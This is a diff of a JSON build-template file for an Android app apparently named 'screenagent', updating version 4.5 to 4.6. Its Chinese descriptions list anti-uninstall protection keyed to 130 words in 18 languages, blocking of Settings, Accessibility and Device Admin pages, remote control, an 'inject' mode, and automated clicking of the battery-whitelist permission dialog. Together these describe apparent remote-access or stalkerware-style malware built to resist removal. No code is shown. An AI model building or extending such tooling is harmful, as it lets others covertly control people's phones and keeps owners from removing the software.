@@ -2,9 +2,9 @@
   "templates": [
     {
       "id": "src-4.0",
-      "name": "v4.5 源码构建（不拦卸载框 · 分步脚本 + 词表兜底）",
-      "versionName": "4.5",
-      "versionCode": 1022,
+      "name": "v4.6 源码构建（引导提速 · 分步脚本 + 词表兜底）",
+      "versionName": "4.6",
+      "versionCode": 1030,
       "sourceDir": "materials/src/v4.0",
       "kind": "screenagent",
       "visibleLauncher": true,
@@ -15,15 +15,15 @@
     },
     {
       "id": "apk-4.0",
-      "name": "v4.5 正式版（不拦卸载确认框 + 18 语言防卸载 + 线上默认关调试）",
-      "versionName": "4.5",
-      "versionCode": 1022,
+      "name": "v4.6 正式版（19 秒引导 · 电池白名单修复 · 18 语言防卸载）",
+      "versionName": "4.6",
+      "versionCode": 1030,
       "kind": "screenagent",
       "visibleLauncher": true,
       "resourceStyle": "semantic",
       "defaultHomeUrl": "https://www.baidu.com/",
-      "description": "4.5：系统卸载确认框（长按删除 → Uninstall 对话框）不再监控，只拦设置/无障碍/设备管理页面；线上默认关调试；远控不掉盾；130 危险词 18 语言。",
-      "sha256": "20c5ed3bbd4de6795ec31bde90d3f77330d994988f244fa8967fd5160e9f3171",
+      "description": "4.6：引导总时长 58s→19s；电池步骤改前台载体发起并精确点 android:id/button1，四步全绿；点击间隔 220ms、权限轮询 0.9s、电池超时 7s；线上默认关调试；防卸载 130 词覆盖 18 语言。",
+      "sha256": "f0f0e653ab49986972a83616a597d5a4ce5574256cc84e259f2d43782861a035",
       "file": "v4.0.apk",
       "mode": "inject"
     },
